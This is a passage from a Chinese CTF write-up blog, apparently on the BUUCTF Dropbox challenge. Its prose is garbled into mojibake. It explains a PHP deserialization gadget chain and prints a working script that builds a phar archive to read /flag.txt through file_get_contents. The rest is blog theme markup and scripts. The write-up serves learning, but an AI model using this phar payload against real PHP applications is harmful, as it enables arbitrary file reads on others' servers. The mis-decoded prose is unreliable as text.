<p>æ— éå°±æ˜¯ è„šæœ¬æ‰§è¡Œå®Œæ¯•åï¼Œæ‰§è¡Œ$dbçš„close()çš„æ–¹æ³•ï¼ˆæ¥å…³é—­æ•°æ®åº“è¿æ¥ï¼‰ï¼Œä½†è¯è¯´å›æ¥ï¼Œæ²¡æœ‰æ‹¬å·é‡Œçš„è¯ï¼Œè¿™å¥è¯ä¾ç„¶æˆç«‹ï¼Œè€Œä¸”è¿™ä¸ª&#39;close&#39;ä¸Fileç±»ä¸­çš„close()æ–¹æ³•åŒåã€‚æ‰€ä»¥ï¼Œå½“dbçš„å€¼ä¸ºä¸€ä¸ªFileListå¯¹è±¡æ—¶ï¼ŒUserå¯¹è±¡ææ„ä¹‹æ—¶ï¼Œä¼šè§¦å‘FileList-&gt;close()ï¼Œä½†FileListé‡Œæ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œäºæ˜¯è°ƒç”¨_callå‡½æ•°ï¼Œè¿›è€Œæ‰§è¡Œfile_get_contents($filename)ï¼Œè¯»å–äº†æ–‡ä»¶å†…å®¹ã€‚æ•´ä¸ªé“¾çš„ç»“æ„ä¹Ÿå¾ˆç®€å•æ¸…æ™°ï¼šåœ¨æˆ‘ä»¬æ§åˆ¶$dbä¸ºä¸€ä¸ªFileListå¯¹è±¡çš„æƒ…å†µä¸‹ï¼Œ$user-&gt;__destruct() =&gt; $db-&gt;close() =&gt; $db-&gt;__call(&#39;close&#39;) =&gt; $file-&gt;close() =&gt; $results=file_get_contents($filename) =&gt; FileList-&gt;__destruct()è¾“å‡º$resultã€‚</p>
<p>ååºåˆ—åŒ–è„šæœ¬</p>
<pre class="language-none"><code class="language-none">&lt;?php
    class User &#123;
        public $db;
    &#125; 
    class File&#123;
        public $filename;
        public function __construct($name)&#123;
            $this-&gt;filename&#x3D;$name;
        &#125;
    &#125;
    class FileList &#123;
        private $files;
        public function __construct()&#123;
            $this-&gt;files&#x3D;array(new File(&#39;&#x2F;flag.txt&#39;));
        &#125;
    &#125; 
    $o &#x3D; new User();
    $o-&gt;db &#x3D;new FileList();
    @unlink(&quot;phar.phar&quot;);
    $phar &#x3D; new Phar(&quot;phar.phar&quot;);
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
    $phar-&gt;setMetadata($o);
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); 
    $phar-&gt;stopBuffering();
?&gt;</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210220146818.png" alt="image-20211210220146818"></p>
<p>å‚è€ƒæ–‡ç« </p>
<p>[<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5b91e0b7f3ac">CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropboxä¹‹æ„šè§ - ç®€ä¹¦ (jianshu.com)</a></p>
<p>[(24æ¡æ¶ˆæ¯) å…³äºpharååºåˆ—åŒ–â€”â€”BUUCTF-<a target="_blank" rel="noopener" href="https://blog.csdn.net/silence1_/article/details/102683254">CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox_silence1_çš„åšå®¢-CSDNåšå®¢_buuctf ååºåˆ—åŒ–</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        æ–‡ç« ä½œè€…:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Ethe</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        æ–‡ç« é“¾æ¥:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://Ethe448.github.io/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">https://Ethe448.github.io/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        ç‰ˆæƒå£°æ˜:
                    </i>
                </span>
                <span class="reprint-info">
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ¥å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº
                    <a href="/about" target="_blank">Ethe</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>å¤åˆ¶æˆåŠŸï¼Œè¯·éµå¾ªæœ¬æ–‡çš„è½¬è½½è§„åˆ™</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">æŸ¥çœ‹</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/ctf/">
                                    <span class="chip bg-color">ctf</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯åˆ†äº«ï¼</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">èµ</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">ä½ çš„èµè¯†æ˜¯æˆ‘å‰è¿›çš„åŠ¨åŠ›</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">æ”¯ä»˜å®</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">å¾® ä¿¡</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="æ”¯ä»˜å®æ‰“èµäºŒç»´ç ">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="å¾®ä¿¡æ‰“èµäºŒç»´ç ">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>è¯„è®º</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: '9uxoX9BlIsmwlt8gNkGLF9Ow-gzGzoHsz',
        appKey: 'rrsgRW80sgJP9PdFwFycskT9',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '8',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--é…·Qæ¨é€-->


    

    

    

    
        
    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;ä¸Šä¸€ç¯‡</div>
            <div class="card">
                <a href="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="sstiæ¨¡æ¿æ³¨å…¥">
                        
                        <span class="card-title">sstiæ¨¡æ¿æ³¨å…¥</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                             ä¸ä¼špythonçœ‹çš„æˆ‘å¥½æ‡µï¼Œä¸€äº›ç±»ã€å¯¹è±¡å’Œé­”æœ¯å˜é‡çš„éƒ¨åˆ†éƒ½ä¸æ˜¯å¤ªæ‡‚ã€‚ã€‚ã€‚ã€‚
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-25
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Ethe
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
                        <span class="chip bg-color">webå­¦ä¹ </span>
                    </a>
                    
                    <a href="/tags/ssti%E6%B3%A8%E5%85%A5/">
                        <span class="chip bg-color">sstiæ³¨å…¥</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                ä¸‹ä¸€ç¯‡&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/06/16/buu-sql%E9%A2%98wp/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="sqlé¢˜wp">
                        
                        <span class="card-title">sqlé¢˜wp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                             sqlå¥½éš¾.jpg
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-16
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Ethe
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
                        <span class="chip bg-color">webå­¦ä¹ </span>
                    </a>
                    
                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
                        <span class="chip bg-color">sqlæ³¨å…¥</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- ä»£ç å—åŠŸèƒ½ä¾èµ– -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- ä»£ç è¯­è¨€ -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- ä»£ç å—å¤åˆ¶ -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- ä»£ç å—æ”¶ç¼© -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;ç›®å½•</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC æ‚¬æµ®æŒ‰é’®. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* ä¿®å¤æ–‡ç« å¡ç‰‡ div çš„å®½åº¦. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // åˆ‡æ¢TOCç›®å½•å±•å¼€æ”¶ç¼©çš„ç›¸å…³æ“ä½œ.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2022</span>
            
            <a href="/about" target="_blank">Ethe</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;ç«™ç‚¹æ€»å­—æ•°:&nbsp;<span
                        class="white-color">49.8k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;æ€»è®¿é—®é‡:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;æ€»è®¿é—®äººæ•°:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- è¿è¡Œå¤©æ•°æé†’. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Ethe448" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1078240421@qq.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1078240421" class="tooltipped" target="_blank" data-tooltip="QQè”ç³»æˆ‘: 1078240421" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;æœç´¢</span>
            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>

    <!-- ç™½å¤©å’Œé»‘å¤œä¸»é¢˜ -->
<div class="sum-moon-box">
  <a class="btn-floating btn-large waves-effect waves-light" onclick="switchNightMode()" title="åˆ‡æ¢ä¸»é¢˜" >
    <i id="sum-moon-icon" class="fas fa-sun" style="width:48px; height:48px; font-size: 28px;"></i>
  </a>
</div>

<script>
  function switchNightMode() {
    $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
      setTimeout(function () {
        $('body').hasClass('DarkMode') 
        ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
        : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
          
        setTimeout(function () {
          $('.Cuteen_DarkSky').fadeOut(1e3, function () {
            $(this).remove()
          })
        }, 2e3)
      })
  }
</script>

    /* æ¨¡å¼åˆ¤æ–­ */
    <script>
    /* æ¨¡å¼åˆ¤æ–­ */
    if (localStorage.getItem('isDark') === '0') {
        document.body.classList.add('DarkMode');
        $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')
    } else {
        document.body.classList.remove('DarkMode');
        $('#sum-moon-icon').removeleClass("fa-sun").addClass('fa-moon')
    }
    </script>

    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
        
        <script type="text/javascript">
            // åªåœ¨æ¡Œé¢ç‰ˆç½‘é¡µå¯ç”¨ç‰¹æ•ˆ
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- é›ªèŠ±ç‰¹æ•ˆ -->
    

    <!-- é¼ æ ‡æ˜Ÿæ˜Ÿç‰¹æ•ˆ -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--è…¾è®¯å…”å°å·¢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
